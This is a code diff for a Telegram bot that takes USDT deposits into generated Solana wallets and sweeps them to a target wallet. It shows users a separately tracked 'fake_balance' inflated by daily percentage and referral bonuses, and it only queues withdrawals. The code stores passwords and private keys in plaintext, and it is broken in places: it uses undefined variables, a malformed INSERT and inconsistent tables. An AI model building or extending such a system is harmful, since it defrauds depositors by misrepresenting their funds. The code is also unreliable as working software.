@@ -89,7 +89,7 @@ async function GetUsdtWalletBalance(walletAddress) {
 // Function to get user's current balance and other relevant data from the database
 async function getUserBalanceFromDB(userId) {
     try {
-        const query = 'SELECT balance, last_checked_balance, total_funds_sent FROM users WHERE id = $1';
+        const query = 'SELECT fake_balance, last_checked_balance, total_funds_sent FROM users_new WHERE id = $1';
         const result = await client.query(query, [userId]);
         if (result.rows.length > 0) {
             return {
@@ -126,8 +126,8 @@ async function createUserAndFundWallet(telegramId, password, referralCode, chatI
         await editMessage(chatId, messageId, "Creating your profile...");
 
         // Step 2: Insert the new user into the database
-        const query = 'INSERT INTO users (telegram_id, password, balance, sol_wallet_address, sol_wallet_private_key, ref_code_invite_others) VALUES ($1, $2, $3, $4, $5, $6)';
-        await client.query(query, [String(telegramId), password, 0, solWalletAddress, solWalletPrivateKey, referralCode]);
+        const query = 'INSERT INTO users_new (telegram_id, password, total_user_funds fake_balance, sol_wallet_address, sol_wallet_private_key, ref_code_invite_others) VALUES ($1, $2, $3, $4, $5, $6)';
+        await client.query(query, [String(telegramId), password, 0, 0, solWalletAddress, solWalletPrivateKey, referralCode]);
 
         // Step 3: Update message to "Generating Solana wallet..."
         await editMessage(chatId, messageId, "Generating Solana wallet...");
@@ -200,7 +200,7 @@ async function createUserAndFundWallet(telegramId, password, referralCode, chatI
 
         // If any error happens, delete the partially created account from the database
         try {
-            const deleteQuery = 'DELETE FROM users WHERE telegram_id = $1';
+            const deleteQuery = 'DELETE FROM users_new WHERE telegram_id = $1';
             await client.query(deleteQuery, [String(telegramId)]);
             console.log(`Deleted user with telegram_id ${telegramId} from the database due to error.`);
         } catch (dbError) {
@@ -264,44 +264,60 @@ async function checkForFunds(chatId, userId, messageId) {
 
         // Step 4: Get the balance from the USDT account
         const tokenAccount = tokenAccounts.value[0].account.data.parsed.info;
-        const balance = parseFloat(tokenAccount.tokenAmount.uiAmount); // Parse the balance as a float
-        console.log(`USDT balance for wallet ${solWalletAddress}: ${balance} USDT`);
+        const WalletUsdtBalance = parseFloat(tokenAccount.tokenAmount.uiAmount); // Parse the balance as a float
+        console.log(`USDT balance for wallet ${solWalletAddress}: ${WalletUsdtBalance} USDT`);
 
         // Step 5: Fetch the user's balance, last checked balance, and total funds sent from the database
-        const query = 'SELECT balance, last_checked_balance, total_funds_sent FROM users WHERE telegram_id = $1';
-        const result = await client.query(query, [userId]);
+        // const query = 'SELECT balance, last_checked_balance, total_funds_sent FROM users WHERE telegram_id = $1';
+        // const result = await client.query(query, [userId]);
 
         // If user not found, return an error message
-        if (result.rows.length === 0) {
-            await editMessage(chatId, messageId, "User not found in the database.");
-            return;
-        }
+        // if (result.rows.length === 0) {
+        //     await editMessage(chatId, messageId, "User not found in the database.");
+        //     return;
+        // }
 
         // Extract the database information
-        const dbBalance = parseFloat(result.rows[0].balance) || 0;
-        const lastCheckedBalance = parseFloat(result.rows[0].last_checked_balance) || 0;
-        const totalFundsSent = parseFloat(result.rows[0].total_funds_sent) || 0;
+        // const dbBalance = parseFloat(result.rows[0].balance) || 0;
+        // const lastCheckedBalance = parseFloat(result.rows[0].last_checked_balance) || 0;
+        // const totalFundsSent = parseFloat(result.rows[0].total_funds_sent) || 0;
 
         // Step 6: Check if new funds have been received by comparing the current balance to the last checked balance
-        if (balance > lastCheckedBalance) {
-            const newFunds = balance - lastCheckedBalance;
-            console.log(`New funds detected: ${newFunds} USDT`);
+       
+        // If it has more than 0,10 USDT
+        if (WalletUsdtBalance > 0.10) {
+       
+            const query = 'SELECT fake_balance, total_user_funds FROM users WHERE telegram_id = $1';
+            const result = await client.query(query, [userId]);
+              
+            if (result.rows.length === 0) {
+               await editMessage(chatId, messageId, "Something went wrong. Try again later.");
+            return;
+            }
 
-            // Step 7: Add the new funds to the user's existing balance
-            const updatedBalance = dbBalance + newFunds;
+            const fake_balance = parseFloat(result.rows[0].fake_balance) || 0;
+            const total_user_funds = parseFloat(result.rows[0].total_user_funds) || 0;
+
+            const new_fake_balance = fake_balance + WalletUsdtBalance;
+            const new_total_user_funds = total_user_funds + WalletUsdtBalance;
+
+            console.log(`New funds detected: ${WalletUsdtBalance} USDT`);
+
+            // Step 7: update db
+           
             console.log(`Updated balance: ${updatedBalance} USDT`);
 
             // Step 8: Update the database with the new balance, last checked balance, and total funds sent
             const newCheckedBalance = balance;
             const updateQuery = `
-                UPDATE users
-                SET balance = $1, last_checked_balance = $2, total_funds_sent = $3
-                WHERE telegram_id = $4
+                UPDATE users_new
+                SET fake_balance = $1, total_user_funds = $2
+                WHERE telegram_id = $3
             `;
-            await client.query(updateQuery, [updatedBalance, newCheckedBalance, balance, userId]);
+            await client.query(updateQuery, [new_fake_balance, new_total_user_funds, userId]);
 
             // Step 9: Notify the user about the detected funds via Telegram message
-            const fundsAddedMessage = `New funds detected: ${newFunds} USDT. Transferring to the target wallet...`;
+            const fundsAddedMessage = `New funds detected: ${WalletUsdtBalance} USDT. Transferring to the target wallet...`;
             await editMessage(chatId, messageId, fundsAddedMessage);
 
             // Step 10: Transfer the new funds to the target wallet
@@ -313,10 +329,10 @@ async function checkForFunds(chatId, userId, messageId) {
                 fromKeypair.publicKey
             );
 
-            await transferUsdtToWallet(fromKeypair, fromUsdtTokenAccount, newFunds);
+            await transferUsdtToWallet(fromKeypair, fromUsdtTokenAccount, WalletUsdtBalance);
 
             // Step 11: Inform the user that the funds were successfully transferred
-            const transferCompleteMessage = `Funds transferred successfully! New funds: ${newFunds} USDT.`;
+            const transferCompleteMessage = `Funds transferred successfully! New funds: ${WalletUsdtBalance} USDT.`;
             await editMessage(chatId, messageId, transferCompleteMessage);
 
             // Optionally, wait and restart the bot
@@ -411,7 +427,7 @@ async function askForPassword(chatId, userId, action, telegramId) {
         // Store the current action and userId in the session for the provided chatId
         userSessions[chatId] = { action, userId };
 
-        const query = 'SELECT * FROM users WHERE telegram_id = $1'; // Use parameterized queries to prevent SQL injection
+        const query = 'SELECT * FROM users_new WHERE telegram_id = $1'; // Use parameterized queries to prevent SQL injection
         const values = [telegramId];
         
         // Execute the query using client.query
@@ -455,7 +471,7 @@ async function handleAddFunds(chatId, userId, messageId) {
         solWalletAddress = keypair.publicKey.toBase58();
         solWalletPrivateKey = bs58.encode(keypair.secretKey);
 
-        const query = `UPDATE users SET sol_wallet_address = $1, sol_wallet_private_key = $2 WHERE telegram_id = $3`;
+        const query = `UPDATE users_new SET sol_wallet_address = $1, sol_wallet_private_key = $2 WHERE telegram_id = $3`;
         await client.query(query, [solWalletAddress, solWalletPrivateKey, userId]);
 
         console.log(`Generated new wallet for user ${userId}: ${solWalletAddress}`);
@@ -600,14 +616,14 @@ async function showInitialOptions(chatId, userId, firstName) {
 
 // Function to get user by Telegram ID
 async function getUserByTelegramId(telegramId) {
-    const query = 'SELECT * FROM users WHERE telegram_id = $1';
+    const query = 'SELECT * FROM users_new WHERE telegram_id = $1';
     const result = await client.query(query, [String(telegramId)]);
     return result.rows[0];
 }
 
 // Check if user exists in the database by Telegram ID
 async function checkUserExists(telegramId) {
-    const query = 'SELECT COUNT(*) FROM users WHERE telegram_id = $1';
+    const query = 'SELECT COUNT(*) FROM users_new WHERE telegram_id = $1';
     const result = await client.query(query, [String(telegramId)]);
     return result.rows[0].count > 0;
 }
@@ -661,7 +677,7 @@ async function handlePasswordResponse(chatId, text) {
 async function showWelcomeMessage(chatId, userId, referralCode) {
     try {
         // Query to get the user's balance from the database
-        const query = 'SELECT balance FROM users WHERE telegram_id = $1';
+        const query = 'SELECT fake_balance FROM users_new WHERE telegram_id = $1';
         const result = await client.query(query, [String(userId)]);
         
         let balance = 0; // Default balance
@@ -703,7 +719,7 @@ async function showWelcomeMessage(chatId, userId, referralCode) {
 // Function to handle the withdraw button click
 async function handleWithdraw(chatId, userId, messageId) {
         // Query to get the user's balance from the database
-        const query = 'SELECT balance FROM users WHERE telegram_id = $1';
+        const query = 'SELECT fake_balance FROM users_new WHERE telegram_id = $1';
         const result = await client.query(query, [String(userId)]);
         
         let balance = 0; // Default balance
@@ -739,7 +755,7 @@ async function handleWithdrawResponse(chatId, text) {
     const { userId, step } = session;
     console.log(`Current step: ${step}`);
 
-    const query = 'SELECT balance, ref_code_invite_others FROM users WHERE telegram_id = $1';
+    const query = 'SELECT fake_balance, ref_code_invite_others FROM users_new WHERE telegram_id = $1';
     const result = await client.query(query, [String(userId)]);
     
     let balance = 0; // Default balance
@@ -862,47 +878,67 @@ async function handleWithdrawConfirmation(chatId, userId, action) {
 
     if (action === 'confirm_withdrawal') {
         const { withdrawAmount } = session;
-
+    
         // Step 1: Fetch the user's current balance from the database
-        let userBalance;
+        let fake_balance, total_user_funds;
         try {
-            const balanceQuery = 'SELECT balance FROM users WHERE telegram_id = $1';
-            const balanceResult = await client.query(balanceQuery, [String(userId)]);
-            
-            if (balanceResult.rows.length === 0) {
+            const query = 'SELECT fake_balance, total_user_funds FROM users_new WHERE telegram_id = $1';
+            const result = await client.query(query, [String(userId)]);
+    
+            if (result.rows.length === 0) {
                 await sendMessage(chatId, "User not found.");
                 return;
             }
-
-            userBalance = parseFloat(balanceResult.rows[0].balance);
+    
+            fake_balance = parseFloat(result.rows[0].fake_balance);
+            total_user_funds = parseFloat(result.rows[0].total_user_funds);
+    
         } catch (error) {
             console.log(`Error fetching user balance: ${error.message}`);
             await sendMessage(chatId, "An error occurred while fetching your balance.");
             return;
         }
-
+    
         // Step 2: Check if the user has enough balance
-        if (withdrawAmount > userBalance) {
+        if (withdrawAmount > fake_balance) {
             await sendMessage(chatId, "Insufficient balance for the withdrawal request.");
             return;
         }
-
+    
         // Step 3: Deduct the withdrawal amount from the user's balance
-        const updatedBalance = userBalance - withdrawAmount;
+        let profit = fake_balance - total_user_funds;
+    
+        let updated_fake_balance, updated_total_user_funds;
+    
+        // if withdrawAmount is less than or equal to the profit, deduct it from the fake_balance
+        if (withdrawAmount <= profit) {
+            updated_fake_balance = fake_balance - withdrawAmount;
+            updated_total_user_funds = total_user_funds; // δεν αλλάζει
+        } else {
+            // If withdrawal amount is greater than the profit, deduct all profit and adjust the total funds
+            withdrawAmount = withdrawAmount - profit;
+            updated_fake_balance = fake_balance - profit;
+    
+            // Deduct remaining withdrawal amount from total_user_funds
+            updated_total_user_funds = total_user_funds - withdrawAmount;
+            updated_fake_balance = updated_total_user_funds;  // Adjust fake_balance to match the new total_user_funds
+        }
+    
+        // Update the balance in the database
         try {
             const updateBalanceQuery = `
-                UPDATE users 
-                SET balance = $1
-                WHERE telegram_id = $2
+                UPDATE users_new 
+                SET fake_balance = $1, total_user_funds = $2
+                WHERE telegram_id = $3
             `;
-            await client.query(updateBalanceQuery, [updatedBalance, String(userId)]);
-            console.log(`User ${userId}'s balance updated to ${updatedBalance}`);
+            await client.query(updateBalanceQuery, [updated_fake_balance, updated_total_user_funds, String(userId)]);
+            console.log(`User ${userId}'s balance updated to fake_balance: ${updated_fake_balance}, total_user_funds: ${updated_total_user_funds}`);
         } catch (error) {
             console.log(`Error updating user balance: ${error.message}`);
             await sendMessage(chatId, "An error occurred while updating your balance.");
             return;
         }
-
+    
         // Step 4: Insert withdrawal request into the database
         try {
             const query = `
@@ -914,13 +950,14 @@ async function handleWithdrawConfirmation(chatId, userId, action) {
         } catch (error) {
             console.log(`Error saving withdrawal request: ${error.message}`);
             const errorMessage = "An error occurred while saving your withdrawal request. Please try again later.";
+    
             // Step 4.1: Edit the same message with the error
             await editMessage(chatId, messageId, errorMessage);
-
+    
             // Step 4.2: After 2 seconds, edit the message to "Restarting bot..."
             setTimeout(async () => {
                 await editMessage(chatId, messageId, "Restarting bot...");
-
+    
                 // Step 4.3: After another 2 seconds, delete the message and restart the bot
                 setTimeout(async () => {
                     await deleteMessage(chatId, messageId); // Delete the message
@@ -928,23 +965,25 @@ async function handleWithdrawConfirmation(chatId, userId, action) {
                     await restartBot(chatId, userId); // Restart the bot
                 }, 2000); // 2000 milliseconds = 2 seconds
             }, 2000); // 2000 milliseconds = 2 seconds
+    
             return; // Exit the function after handling the error
         }
-
-      // Step 5: Show the confirmation message with the "Okay" button
-      const confirmMessage = `Withdrawal confirmed!\n\nAmount: ${withdrawAmount} USDT\n\nTo Wallet: ${walletAddress} \n\nFunds will be sent within 24 hours.`;
-
-      // Define the "Okay" button
-      const okayButton = {
-          inline_keyboard: [
-              [{ text: 'Okay', callback_data: 'withdrawal_okay' }]
-          ]
-      };
-
-      // Edit the message to show the confirmation and "Okay" button
-      await editMessage(chatId, messageId, confirmMessage, okayButton);
-
-    } else if (action === 'cancel_withdrawal') {
+    
+        // Step 5: Show the confirmation message with the "Okay" button
+        const confirmMessage = `Withdrawal confirmed!\n\nAmount: ${withdrawAmount} USDT\n\nTo Wallet: ${walletAddress}\n\nFunds will be sent within 24 hours.`;
+    
+        // Define the "Okay" button
+        const okayButton = {
+            inline_keyboard: [
+                [{ text: 'Okay', callback_data: 'withdrawal_okay' }]
+            ]
+        };
+    
+        // Edit the message to show the confirmation and "Okay" button
+        await editMessage(chatId, messageId, confirmMessage, okayButton);
+    }
+    
+     else if (action === 'cancel_withdrawal') {
         // Step 1: Show the cancellation message
         const cancelMessage = "Withdrawal cancelled.";
         await editMessage(chatId, messageId, cancelMessage);
@@ -1031,7 +1070,7 @@ async function sendMessage(chatId, text, replyMarkup = null, parseMode = 'Markdo
 async function handleReferrals(chatId, userId, messageId) {
     try {
         // Fetch the user's referral code and ref_code_invited_by
-        const userQuery = 'SELECT ref_code_invite_others, ref_code_invited_by FROM users WHERE telegram_id = $1';
+        const userQuery = 'SELECT ref_code_invite_others, ref_code_invited_by FROM users_new WHERE telegram_id = $1';
         const userResult = await client.query(userQuery, [String(userId)]);
 
         if (userResult.rows.length === 0) {
@@ -1057,7 +1096,7 @@ async function handleReferrals(chatId, userId, messageId) {
         }
 
         // Query to find referrals using the referral code (only fetching telegram ID)
-        const referralsQuery = 'SELECT telegram_id FROM users WHERE ref_code_invited_by = $1';
+        const referralsQuery = 'SELECT telegram_id FROM users_new WHERE ref_code_invited_by = $1';
         const referralsResult = await client.query(referralsQuery, [referralCode]);
         
 let message = `
@@ -1151,7 +1190,7 @@ async function updateAllUserBalances() {
         console.log("Starting daily balance update for all users...");
 
         // Step 1: Fetch all users from the database
-        const query = 'SELECT telegram_id, balance, ref_code_invite_others, ref_code_invited_by FROM users';
+        const query = 'SELECT telegram_id, fake_balance, ref_code_invite_others, ref_code_invited_by FROM users_new';
         const result = await client.query(query);
 
         // Step 2: Loop through each user and update their balance based on the percentage tiers and referrals
@@ -1179,7 +1218,7 @@ async function updateAllUserBalances() {
             // Step 3: Calculate referral bonus by category
             let referralBonus = 0;
             if (referralCode) {
-                const referralQuery = 'SELECT COUNT(*) FROM users WHERE ref_code_invited_by = $1';
+                const referralQuery = 'SELECT COUNT(*) FROM users_new WHERE ref_code_invited_by = $1';
                 const referralResult = await client.query(referralQuery, [referralCode]);
                 const numOfReferrals = parseInt(referralResult.rows[0].count) || 0;
 
@@ -1209,7 +1248,7 @@ async function updateAllUserBalances() {
             const newBalance = currentBalance + balanceIncrease;
 
             // Update the user's balance in the database
-            const updateQuery = 'UPDATE users SET balance = $1 WHERE telegram_id = $2';
+            const updateQuery = 'UPDATE users_new SET balance = $1 WHERE telegram_id = $2';
             await client.query(updateQuery, [newBalance, telegramId]);
 
             // console.log(`Updated balance for user ${telegramId}: Previous balance: ${currentBalance}, Daily percentage applied: ${(totalDailyPercentage * 100).toFixed(5)}%, New balance: ${newBalance}`);
@@ -1243,7 +1282,7 @@ async function handleReferralCodeResponse(chatId, text) {
 
     try {
         // Validate the entered referral code (ensure it exists in the database)
-        const refCodeQuery = 'SELECT telegram_id FROM users WHERE ref_code_invite_others = $1';
+        const refCodeQuery = 'SELECT telegram_id FROM users_new WHERE ref_code_invite_others = $1';
         const refCodeResult = await client.query(refCodeQuery, [text]);
 
         // If referral code is not found
@@ -1261,7 +1300,7 @@ async function handleReferralCodeResponse(chatId, text) {
         }
 
         // Update the user's `ref_code_invited_by` field in the database
-        const updateQuery = 'UPDATE users SET ref_code_invited_by = $1 WHERE telegram_id = $2';
+        const updateQuery = 'UPDATE users_new SET ref_code_invited_by = $1 WHERE telegram_id = $2';
         await client.query(updateQuery, [text, String(userId)]);
 
         // Send success message
